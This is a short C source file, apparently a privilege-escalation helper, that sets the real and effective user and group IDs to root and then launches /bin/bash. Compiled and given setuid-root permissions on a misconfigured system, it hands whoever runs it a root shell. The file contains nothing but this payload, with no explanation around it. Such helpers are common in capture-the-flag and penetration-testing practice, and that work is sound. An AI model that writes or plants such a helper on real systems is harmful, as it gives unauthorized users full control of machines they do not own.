#include <unistd.h>
void main() { 
    setuid(0); seteuid(0); setgid(0); setegid(0); 
    execl("/bin/bash", "bash", NULL);
}
